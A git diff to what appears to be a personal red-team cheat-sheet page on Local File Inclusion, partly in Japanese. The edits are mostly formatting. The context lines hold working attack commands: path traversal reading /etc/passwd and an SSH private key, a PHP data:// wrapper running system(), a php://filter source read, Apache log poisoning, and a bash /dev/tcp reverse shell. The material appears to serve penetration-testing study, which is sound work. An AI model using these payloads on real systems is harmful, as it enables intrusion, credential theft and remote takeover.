@@ -1,5 +1,5 @@
 ---
-title: Local File Inclusion
+title: LFI(Local File Inclusion)
 parent: Web Attack
 grand_parent: Red Team
 ---
@@ -27,6 +27,7 @@ http://<IP>/index.php?page=../../../../etc/passwd
 ```bash
 curl http://<IP>/index.php?file=../../../../home/user/.ssh/id_rsa
 ```
+
 If vulnerable → read files / get creds
 
 #### Example:
@@ -82,14 +83,20 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 - PHP Wrapperを利用したLFI
 PHPのWrapperを使用して、ファイルの内容をリモートから取得します：
+
 ```bash
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
+```
+
+```bash
 curl "http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
 ```
+
 ---
 ## 例　ログポイズニング
 ### /var/log/apache2/access.logにコードを書き込む
 1. curlを使って、発見したディレクトリトラバーサルの脆弱性を利用してファイルaccess.logを表示
+
 ```bash
 curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ```
@@ -99,6 +106,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
 ...
 ```
+
 ログエントリにユーザーエージェントが含まれていることを示している。
 
 ### 以降Burpを使用
